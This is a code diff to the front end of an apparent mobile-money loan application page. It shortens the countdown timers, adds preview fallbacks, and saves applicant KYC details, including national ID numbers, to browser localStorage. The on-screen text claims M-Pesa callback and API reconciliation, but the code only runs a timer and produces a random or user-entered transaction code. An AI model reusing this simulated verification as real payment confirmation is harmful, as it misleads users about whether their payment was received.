@@ -266,7 +266,7 @@
             <!-- Countdown Timer Box -->
             <div class="countdown-box">
                 <span class="countdown-label">Waiting for M-Pesa Callback</span>
-                <span id="stk-timer" class="countdown-timer">01:00</span>
+                <span id="stk-timer" class="countdown-timer">00:30</span>
             </div>
 
             <p style="font-size: 0.68rem; color: #94a3b8;">Do not close or refresh this page while payment processes.
@@ -299,7 +299,7 @@
             <!-- Countdown Timer Box -->
             <div class="countdown-box">
                 <span class="countdown-label">Reconciling with M-Pesa API</span>
-                <span id="verify-timer" class="countdown-timer">01:00</span>
+                <span id="verify-timer" class="countdown-timer">00:30</span>
             </div>
 
             <p style="font-size: 0.68rem; color: #94a3b8;">Do not close or refresh this page while verification
@@ -407,13 +407,24 @@
     <!-- Interactive Script -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // Retrieve session parameters
-            const userPhone = sessionStorage.getItem('user_phone');
-            const selectedPrincipal = sessionStorage.getItem('selected_principal');
+            // Retrieve session parameters safely
+            let userPhone = '';
+            let selectedPrincipal = '';
+            try {
+                userPhone = sessionStorage.getItem('user_phone');
+                selectedPrincipal = sessionStorage.getItem('selected_principal');
+            } catch (e) {
+                console.warn('Session storage not accessible:', e);
+            }
 
             if (!userPhone || !selectedPrincipal) {
-                window.location.href = 'index.html';
-                return;
+                if (window.location.protocol === 'file:' || window.location.search.includes('preview')) {
+                    userPhone = '0712345678';
+                    selectedPrincipal = '3000';
+                } else {
+                    window.location.href = 'index.html';
+                    return;
+                }
             }
 
             // Populate static UI elements
@@ -558,6 +569,30 @@
                     return;
                 }
 
+                // Helper to save application to localStorage
+                function saveApplication(appId, mpesaCode) {
+                    const newApp = {
+                        appId: appId,
+                        applicantName: nameVal,
+                        applicantId: idVal,
+                        userPhone: userPhone || '0700000000',
+                        altPhone: altPhoneVal,
+                        county: countySelect.value,
+                        employment: employmentSelect.value,
+                        principal: selectedPrincipal || '2000',
+                        total: sessionStorage.getItem('total_repayable') || (parseInt(selectedPrincipal || '2000') + 50).toString(),
+                        mpesaCode: mpesaCode,
+                        submittedAt: new Date().toISOString(),
+                        status: 'PENDING'
+                    };
+                    
+                    const existingApps = JSON.parse(localStorage.getItem('daima_loans_applications') || '[]');
+                    if (!existingApps.some(a => a.appId === appId)) {
+                        existingApps.unshift(newApp);
+                        localStorage.setItem('daima_loans_applications', JSON.stringify(existingApps));
+                    }
+                }
+
                 // Save KYC details in session storage
                 sessionStorage.setItem('applicant_name', nameVal);
                 sessionStorage.setItem('applicant_id', idVal);
@@ -573,9 +608,9 @@
                     // Show STK push modal with active transition class
                     stkModal.classList.add('active');
 
-                    // Simulate STK Countdown Timer (60 seconds simulated verification)
-                    let timeLeft = 60;
-                    stkTimer.textContent = `01:00`;
+                    // Simulate STK Countdown Timer (30 seconds simulated verification)
+                    let timeLeft = 30;
+                    stkTimer.textContent = `00:30`;
 
                     const countdown = setInterval(() => {
                         timeLeft--;
@@ -588,6 +623,8 @@
 
                             // Generate mock M-Pesa Code
                             const randomMpesaCode = 'QK' + Math.floor(10000000 + Math.random() * 90000000);
+
+                            saveApplication(randomAppId, randomMpesaCode);
 
                             sessionStorage.setItem('app_id', randomAppId);
                             sessionStorage.setItem('mpesa_code', randomMpesaCode);
@@ -612,8 +649,8 @@
                     verifyingCodeDisplay.textContent = enteredCode;
                     verifyModal.classList.add('active');
 
-                    let timeLeft = 60;
-                    verifyTimer.textContent = `01:00`;
+                    let timeLeft = 30;
+                    verifyTimer.textContent = `00:30`;
 
                     const countdown = setInterval(() => {
                         timeLeft--;
@@ -623,6 +660,8 @@
 
                         if (timeLeft <= 0) {
                             clearInterval(countdown);
+
+                            saveApplication(randomAppId, enteredCode);
 
                             sessionStorage.setItem('app_id', randomAppId);
                             sessionStorage.setItem('mpesa_code', enteredCode);
